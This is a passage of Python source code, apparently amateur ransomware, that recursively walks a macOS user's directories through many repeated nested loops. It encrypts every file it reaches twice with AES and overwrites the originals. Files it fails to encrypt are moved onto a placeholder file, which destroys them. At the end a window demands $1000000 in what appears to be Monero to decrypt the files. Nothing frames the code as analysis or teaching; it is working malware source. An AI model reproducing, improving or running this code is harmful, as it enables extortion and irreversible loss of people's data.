                                                                                                f.write("file used for overwriting purposes")

                                                                                            shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                                            print("overwriting of ", temppath, " was a success")

                                                                                    except:
                                                                                            list17.append(temppath)
                                                                                            print("appending of ", temppath, " to directory list was a success")


                                                                        if len(list17) > 0:
                                                                            #/root/dogs/germanshep
                                                                            for directory_path in list17:
                                                                                components = os.listdir(directory_path)
                                                                                for component in components:
                                                                                    temppath = directory_path + '/' + component
                                                                                    if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                                        continue

                                                                                    print("current path we are on is: ", temppath)


                                                                                    try:
                                                                                        with open(str(temppath), 'rb') as c:
                                                                                            contents = c.read()
                                                                                            #print(f"contents of tempath {temppath} is:",contents)
                                                                                        #apply encryption
                                                                                        encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                                        print(encrypted_mess)

                                                                                        print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                                        
                                                                                        doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                                        print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                                        if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                                            with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                                                f.write(doubleencrypted_mess)

                                                                                            dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                                            with open(dmgpath, "wb") as g:
                                                                                                pass

                                                                                            shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                                            shutil.move(dmgpath,temppath)
                                                                                                
                                                                                        else:
                                                                                            with open(str(temppath), "wb") as f:
                                                                                                f.write(doubleencrypted_mess)
                                                                                    
                                                                                    
                                                                                    except:
                                                                                        try: 
                                                                                                with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                                                    f.write("file used for overwriting purposes")

                                                                                                shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                                                print("overwriting of ", temppath, " was a success")

                                                                                        except:
                                                                                                list18.append(temppath)
                                                                                                print("appending of ", temppath, " to directory list was a success")


                                                                            if len(list18) > 0:
                                                                                #/root/dogs/germanshep
                                                                                for directory_path in list18:
                                                                                    components = os.listdir(directory_path)
                                                                                    for component in components:
                                                                                        temppath = directory_path + '/' + component
                                                                                        if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                                            continue

                                                                                        print("current path we are on is: ", temppath)


                                                                                        try:
                                                                                            with open(str(temppath), 'rb') as c:
                                                                                                contents = c.read()
                                                                                                #print(f"contents of tempath {temppath} is:",contents)
                                                                                            #apply encryption
                                                                                            encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                                            print(encrypted_mess)

                                                                                            print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                                            
                                                                                            doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                                            print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                                            if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                                                with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                                                    f.write(doubleencrypted_mess)

                                                                                                dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                                                with open(dmgpath, "wb") as g:
                                                                                                    pass

                                                                                                shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                                                shutil.move(dmgpath,temppath)
                                                                                                    
                                                                                            else:
                                                                                                with open(str(temppath), "wb") as f:
                                                                                                    f.write(doubleencrypted_mess)
                                                                                        
                                                                                        
                                                                                        except:
                                                                                            try: 
                                                                                                    with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                                                        f.write("file used for overwriting purposes")

                                                                                                    shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                                                    print("overwriting of ", temppath, " was a success")

                                                                                            except:
                                                                                                    list19.append(temppath)
                                                                                                    print("appending of ", temppath, " to directory list was a success")



                                                                                if len(list19) > 0:
                                                                                    #/root/dogs/germanshep
                                                                                    for directory_path in list19:
                                                                                        components = os.listdir(directory_path)
                                                                                        for component in components:
                                                                                            temppath = directory_path + '/' + component
                                                                                            if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                                                continue

                                                                                            print("current path we are on is: ", temppath)


                                                                                            try:
                                                                                                with open(str(temppath), 'rb') as c:
                                                                                                    contents = c.read()
                                                                                                    #print(f"contents of tempath {temppath} is:",contents)
                                                                                                #apply encryption
                                                                                                encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                                                print(encrypted_mess)

                                                                                                print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                                                
                                                                                                doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                                                print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                                                if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                                                    with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                                                        f.write(doubleencrypted_mess)

                                                                                                    dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                                                    with open(dmgpath, "wb") as g:
                                                                                                        pass

                                                                                                    shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                                                    shutil.move(dmgpath,temppath)
                                                                                                        
                                                                                                else:
                                                                                                    with open(str(temppath), "wb") as f:
                                                                                                        f.write(doubleencrypted_mess)
                                                                                            
                                                                                            
                                                                                            except:
                                                                                                try: 
                                                                                                        with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                                                            f.write("file used for overwriting purposes")

                                                                                                        shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                                                        print("overwriting of ", temppath, " was a success")

                                                                                                except:
                                                                                                        list20.append(temppath)
                                                                                                        print("appending of ", temppath, " to directory list was a success")

                                                                                    
                                                                                    if len(list20) > 0:
                                                                                        #/root/dogs/germanshep
                                                                                        for directory_path in list20:
                                                                                            components = os.listdir(directory_path)
                                                                                            for component in components:
                                                                                                temppath = directory_path + '/' + component
                                                                                                if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                                                    continue

                                                                                                print("current path we are on is: ", temppath)


                                                                                                try:
                                                                                                    with open(str(temppath), 'rb') as c:
                                                                                                        contents = c.read()
                                                                                                        #print(f"contents of tempath {temppath} is:",contents)
                                                                                                    #apply encryption
                                                                                                    encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                                                    print(encrypted_mess)

                                                                                                    print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                                                    
                                                                                                    doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                                                    print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                                                    if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                                                        with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                                                            f.write(doubleencrypted_mess)

                                                                                                        dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                                                        with open(dmgpath, "wb") as g:
                                                                                                            pass

                                                                                                        shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                                                        shutil.move(dmgpath,temppath)
                                                                                                            
                                                                                                    else:
                                                                                                        with open(str(temppath), "wb") as f:
                                                                                                            f.write(doubleencrypted_mess)
                                                                                                
                                                                                                
                                                                                                except:
                                                                                                    try: 
                                                                                                            with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                                                                f.write("file used for overwriting purposes")

                                                                                                            shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                                                            print("overwriting of ", temppath, " was a success")

                                                                                                    except:
                                                                                                            list21.append(temppath)
                                                                                                            print("appending of ", temppath, " to directory list was a success")


                                                                                        if len(list21) > 0:
                                                                                            #/root/dogs/germanshep
                                                                                            for directory_path in list21:
                                                                                                components = os.listdir(directory_path)
                                                                                                for component in components:
                                                                                                    temppath = directory_path + '/' + component
                                                                                                    if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                                                        continue

                                                                                                    print("current path we are on is: ", temppath)


                                                                                                    try:
                                                                                                        with open(str(temppath), 'rb') as c:
                                                                                                            contents = c.read()
                                                                                                            #print(f"contents of tempath {temppath} is:",contents)
                                                                                                        #apply encryption
                                                                                                        encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                                                        print(encrypted_mess)

                                                                                                        print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                                                        
                                                                                                        doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                                                        print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                                                        if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                                                            with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                                                                f.write(doubleencrypted_mess)

                                                                                                            dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                                                            with open(dmgpath, "wb") as g:
                                                                                                                pass

                                                                                                            shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                                                            shutil.move(dmgpath,temppath)
                                                                                                                
                                                                                                        else:
                                                                                                            with open(str(temppath), "wb") as f:
                                                                                                                f.write(doubleencrypted_mess)
                                                                                                    
                                                                                                    
                                                                                                    except:
                                                                                                        try: 
                                                                                                                with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                                                                    f.write("file used for overwriting purposes")

                                                                                                                shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                                                                print("overwriting of ", temppath, " was a success")

                                                                                                        except:
                                                                                                                list22.append(temppath)
                                                                                                                print("appending of ", temppath, " to directory list was a success")



                                                                                            if len(list22) > 0:
                                                                                                #/root/dogs/germanshep
                                                                                                for directory_path in list22:
                                                                                                    components = os.listdir(directory_path)
                                                                                                    for component in components:
                                                                                                        temppath = directory_path + '/' + component
                                                                                                        if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                                                            continue

                                                                                                        print("current path we are on is: ", temppath)


                                                                                                        try:
                                                                                                            with open(str(temppath), 'rb') as c:
                                                                                                                contents = c.read()
                                                                                                                #print(f"contents of tempath {temppath} is:",contents)
                                                                                                            #apply encryption
                                                                                                            encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                                                            print(encrypted_mess)

                                                                                                            print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                                                            
                                                                                                            doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                                                            print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                                                            if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                                                                with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                                                                    f.write(doubleencrypted_mess)

                                                                                                                dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                                                                with open(dmgpath, "wb") as g:
                                                                                                                    pass

                                                                                                                shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                                                                shutil.move(dmgpath,temppath)
                                                                                                                    
                                                                                                            else:
                                                                                                                with open(str(temppath), "wb") as f:
                                                                                                                    f.write(doubleencrypted_mess)
                                                                                                        
                                                                                                        
                                                                                                        except:
                                                                                                            try: 
                                                                                                                    with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                                                                        f.write("file used for overwriting purposes")

                                                                                                                    shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                                                                    print("overwriting of ", temppath, " was a success")

                                                                                                            except:
                                                                                                                    list23.append(temppath)
                                                                                                                    print("appending of ", temppath, " to directory list was a success")




                                                                                                if len(list23) > 0:
                                                                                                    #/root/dogs/germanshep
                                                                                                    for directory_path in list23:
                                                                                                        components = os.listdir(directory_path)
                                                                                                        for component in components:
                                                                                                            temppath = directory_path + '/' + component
                                                                                                            if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                                                                continue

                                                                                                            print("current path we are on is: ", temppath)


                                                                                                            try:
                                                                                                                with open(str(temppath), 'rb') as c:
                                                                                                                    contents = c.read()
                                                                                                                    #print(f"contents of tempath {temppath} is:",contents)
                                                                                                                #apply encryption
                                                                                                                encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                                                                print(encrypted_mess)

                                                                                                                print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                                                                
                                                                                                                doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                                                                print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                                                                if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                                                                    with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                                                                        f.write(doubleencrypted_mess)

                                                                                                                    dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                                                                    with open(dmgpath, "wb") as g:
                                                                                                                        pass

                                                                                                                    shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                                                                    shutil.move(dmgpath,temppath)
                                                                                                                        
                                                                                                                else:
                                                                                                                    with open(str(temppath), "wb") as f:
                                                                                                                        f.write(doubleencrypted_mess)
                                                                                                            
                                                                                                            
                                                                                                            except:
                                                                                                                try: 
                                                                                                                        with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                                                                            f.write("file used for overwriting purposes")

                                                                                                                        shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                                                                        print("overwriting of ", temppath, " was a success")

                                                                                                                except:
                                                                                                                        list24.append(temppath)
                                                                                                                        print("appending of ", temppath, " to directory list was a success")


                                                                                                    if len(list24) > 0:
                                                                                                        #/root/dogs/germanshep
                                                                                                        for directory_path in list24:
                                                                                                            components = os.listdir(directory_path)
                                                                                                            for component in components:
                                                                                                                temppath = directory_path + '/' + component
                                                                                                                if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                                                                    continue

                                                                                                                print("current path we are on is: ", temppath)


                                                                                                                try:
                                                                                                                    with open(str(temppath), 'rb') as c:
                                                                                                                        contents = c.read()
                                                                                                                        #print(f"contents of tempath {temppath} is:",contents)
                                                                                                                    #apply encryption
                                                                                                                    encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                                                                    print(encrypted_mess)

                                                                                                                    print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                                                                    
                                                                                                                    doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                                                                    print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                                                                    if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                                                                        with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                                                                            f.write(doubleencrypted_mess)

                                                                                                                        dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                                                                        with open(dmgpath, "wb") as g:
                                                                                                                            pass

                                                                                                                        shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                                                                        shutil.move(dmgpath,temppath)
                                                                                                                            
                                                                                                                    else:
                                                                                                                        with open(str(temppath), "wb") as f:
                                                                                                                            f.write(doubleencrypted_mess)
                                                                                                                
                                                                                                                
                                                                                                                except:
                                                                                                                    try: 
                                                                                                                            with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                                                                                f.write("file used for overwriting purposes")

                                                                                                                            shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                                                                            print("overwriting of ", temppath, " was a success")

                                                                                                                    except:
                                                                                                                            list25.append(temppath)
                                                                                                                            print("appending of ", temppath, " to directory list was a success")



                                                                                                        if len(list25) > 0:
                                                                                                            #/root/dogs/germanshep
                                                                                                            for directory_path in list25:
                                                                                                                components = os.listdir(directory_path)
                                                                                                                for component in components:
                                                                                                                    temppath = directory_path + '/' + component
                                                                                                                    if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                                                                        continue

                                                                                                                    print("current path we are on is: ", temppath)


                                                                                                                    try:
                                                                                                                        with open(str(temppath), 'rb') as c:
                                                                                                                            contents = c.read()
                                                                                                                            #print(f"contents of tempath {temppath} is:",contents)
                                                                                                                        #apply encryption
                                                                                                                        encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                                                                        print(encrypted_mess)

                                                                                                                        print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                                                                        
                                                                                                                        doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                                                                        print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                                                                        if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                                                                            with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                                                                                f.write(doubleencrypted_mess)

                                                                                                                            dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                                                                            with open(dmgpath, "wb") as g:
                                                                                                                                pass

                                                                                                                            shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                                                                            shutil.move(dmgpath,temppath)
                                                                                                                                
                                                                                                                        else:
                                                                                                                            with open(str(temppath), "wb") as f:
                                                                                                                                f.write(doubleencrypted_mess)
                                                                                                                    
                                                                                                                    
                                                                                                                    except:
                                                                                                                        try: 
                                                                                                                                with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                                                                                    f.write("file used for overwriting purposes")

                                                                                                                                shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                                                                                print("overwriting of ", temppath, " was a success")

                                                                                                                        except:
                                                                                                                                list26.append(temppath)
                                                                                                                                print("appending of ", temppath, " to directory list was a success")



                                                                                                            if len(list26) > 0:
                                                                                                                #/root/dogs/germanshep
                                                                                                                for directory_path in list26:
                                                                                                                    components = os.listdir(directory_path)
                                                                                                                    for component in components:
                                                                                                                        temppath = directory_path + '/' + component
                                                                                                                        if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                                                                            continue

                                                                                                                        print("current path we are on is: ", temppath)


                                                                                                                        try:
                                                                                                                            with open(str(temppath), 'rb') as c:
                                                                                                                                contents = c.read()
                                                                                                                                #print(f"contents of tempath {temppath} is:",contents)
                                                                                                                            #apply encryption
                                                                                                                            encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                                                                            print(encrypted_mess)

                                                                                                                            print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                                                                            
                                                                                                                            doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                                                                            print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                                                                            if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                                                                                with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                                                                                    f.write(doubleencrypted_mess)

                                                                                                                                dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                                                                                with open(dmgpath, "wb") as g:
                                                                                                                                    pass

                                                                                                                                shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                                                                                shutil.move(dmgpath,temppath)
                                                                                                                                    
                                                                                                                            else:
                                                                                                                                with open(str(temppath), "wb") as f:
                                                                                                                                    f.write(doubleencrypted_mess)
                                                                                                                        
                                                                                                                        
                                                                                                                        except:
                                                                                                                            try: 
                                                                                                                                    with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                                                                                        f.write("file used for overwriting purposes")

                                                                                                                                    shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                                                                                    print("overwriting of ", temppath, " was a success")

                                                                                                                            except:
                                                                                                                                    list27.append(temppath)
                                                                                                                                    print("appending of ", temppath, " to directory list was a success")




                                                                                                                if len(list27) > 0:
                                                                                                                    #/root/dogs/germanshep
                                                                                                                    for directory_path in list27:
                                                                                                                        components = os.listdir(directory_path)
                                                                                                                        for component in components:
                                                                                                                            temppath = directory_path + '/' + component
                                                                                                                            if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                                                                                continue

                                                                                                                            print("current path we are on is: ", temppath)


                                                                                                                            try:
                                                                                                                                with open(str(temppath), 'rb') as c:
                                                                                                                                    contents = c.read()
                                                                                                                                    #print(f"contents of tempath {temppath} is:",contents)
                                                                                                                                #apply encryption
                                                                                                                                encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                                                                                print(encrypted_mess)

                                                                                                                                print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                                                                                
                                                                                                                                doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                                                                                print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                                                                                if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                                                                                    with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                                                                                        f.write(doubleencrypted_mess)

                                                                                                                                    dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                                                                                    with open(dmgpath, "wb") as g:
                                                                                                                                        pass

                                                                                                                                    shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                                                                                    shutil.move(dmgpath,temppath)
                                                                                                                                        
                                                                                                                                else:
                                                                                                                                    with open(str(temppath), "wb") as f:
                                                                                                                                        f.write(doubleencrypted_mess)
                                                                                                                            
                                                                                                                            
                                                                                                                            except:
                                                                                                                                try: 
                                                                                                                                        with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                                                                                            f.write("file used for overwriting purposes")

                                                                                                                                        shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                                                                                        print("overwriting of ", temppath, " was a success")

                                                                                                                                except:
                                                                                                                                        list28.append(temppath)
                                                                                                                                        print("appending of ", temppath, " to directory list was a success")


                                                                                                                    if len(list28) > 0:
                                                                                                                        #/root/dogs/germanshep
                                                                                                                        for directory_path in list28:
                                                                                                                            components = os.listdir(directory_path)
                                                                                                                            for component in components:
                                                                                                                                temppath = directory_path + '/' + component
                                                                                                                                if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                                                                                    continue

                                                                                                                                print("current path we are on is: ", temppath)


                                                                                                                                try:
                                                                                                                                    with open(str(temppath), 'rb') as c:
                                                                                                                                        contents = c.read()
                                                                                                                                        #print(f"contents of tempath {temppath} is:",contents)
                                                                                                                                    #apply encryption
                                                                                                                                    encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                                                                                    print(encrypted_mess)

                                                                                                                                    print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                                                                                    
                                                                                                                                    doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                                                                                    print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                                                                                    if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                                                                                        with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                                                                                            f.write(doubleencrypted_mess)

                                                                                                                                        dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                                                                                        with open(dmgpath, "wb") as g:
                                                                                                                                            pass

                                                                                                                                        shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                                                                                        shutil.move(dmgpath,temppath)
                                                                                                                                            
                                                                                                                                    else:
                                                                                                                                        with open(str(temppath), "wb") as f:
                                                                                                                                            f.write(doubleencrypted_mess)
                                                                                                                                
                                                                                                                                
                                                                                                                                except:
                                                                                                                                    try: 
                                                                                                                                            with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                                                                                                f.write("file used for overwriting purposes")

                                                                                                                                            shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                                                                                            print("overwriting of ", temppath, " was a success")

                                                                                                                                    except:
                                                                                                                                            list29.append(temppath)
                                                                                                                                            print("appending of ", temppath, " to directory list was a success")


                                                                                                                        if len(list29) > 0:
                                                                                                                            #/root/dogs/germanshep
                                                                                                                            for directory_path in list29:
                                                                                                                                components = os.listdir(directory_path)
                                                                                                                                for component in components:
                                                                                                                                    temppath = directory_path + '/' + component
                                                                                                                                    if temppath[len(temppath)-9:len(temppath)] == ".DS_Store":
                                                                                                                                        continue

                                                                                                                                    print("current path we are on is: ", temppath)


                                                                                                                                    try:
                                                                                                                                        with open(str(temppath), 'rb') as c:
                                                                                                                                            contents = c.read()
                                                                                                                                            #print(f"contents of tempath {temppath} is:",contents)
                                                                                                                                        #apply encryption
                                                                                                                                        encrypted_mess = cipher1.encrypt(pad(contents, AES.block_size))
                                                                                                                                        print(encrypted_mess)

                                                                                                                                        print("we encrypted the message of ", temppath,": ", encrypted_mess)
                                                                                                                                        
                                                                                                                                        doubleencrypted_mess = cipher2.encrypt(pad(encrypted_mess, AES.block_size))

                                                                                                                                        print("double encrypted outcome of message is: ", doubleencrypted_mess)

                                                                                                                                        if temppath[len(temppath)-3:len(temppath)] == "dmg":
                                                                                                                                            with open("/Users/yallah/Desktop/host4dmg.txt", "wb") as f:
                                                                                                                                                f.write(doubleencrypted_mess)

                                                                                                                                            dmgpath = str(temppath)[0:len(temppath)-4] + "new.dmg"
                                                                                                                                            with open(dmgpath, "wb") as g:
                                                                                                                                                pass

                                                                                                                                            shutil.move("/Users/yallah/Desktop/host4dmg.txt", dmgpath)
                                                                                                                                            shutil.move(dmgpath,temppath)
                                                                                                                                                
                                                                                                                                        else:
                                                                                                                                            with open(str(temppath), "wb") as f:
                                                                                                                                                f.write(doubleencrypted_mess)
                                                                                                                                    
                                                                                                                                    
                                                                                                                                    except:
                                                                                                                                        try: 
                                                                                                                                                with open('/Users/yallah/Desktop/overwrite/wordlisty.txt','w') as f:
                                                                                                                                                    f.write("file used for overwriting purposes")

                                                                                                                                                shutil.move(str(temppath),'/Users/yallah/Desktop/overwrite/wordlisty.txt')
                                                                                                                                                print("overwriting of ", temppath, " was a success")

                                                                                                                                        except:
                                                                                                                                                list30.append(temppath)
                                                                                                                                                print("appending of ", temppath, " to directory list was a success")

root = tk.Tk()

# create canvas
myCanvas = tk.Canvas(root, bg="white", height=300, width=300)
myCanvas.create_text(120, 40, text="to decrypt ur files, use the \n details below and send $1000000", fill="black", font=('Helvetica 15'))
myCanvas.create_text(100, 80, text="Username: dummy monero", fill="black", font=('Helvetica 15'))
myCanvas.create_text(85, 110, text="Password: password1", fill="black", font=('Helvetica 15'))
def callback(url):
   webbrowser.open_new_tab(url)

#Create a Label to display the link
link = tk.Label(root, text="www.tutorialspoint.com",font=('Helveticabold', 15), fg="blue", cursor="hand2")
link.pack()
link.bind("<Button-1>", lambda e:
callback("http://www.tutorialspoint.com"))


myCanvas.pack()
root.mainloop()

























































































































































































































































































































































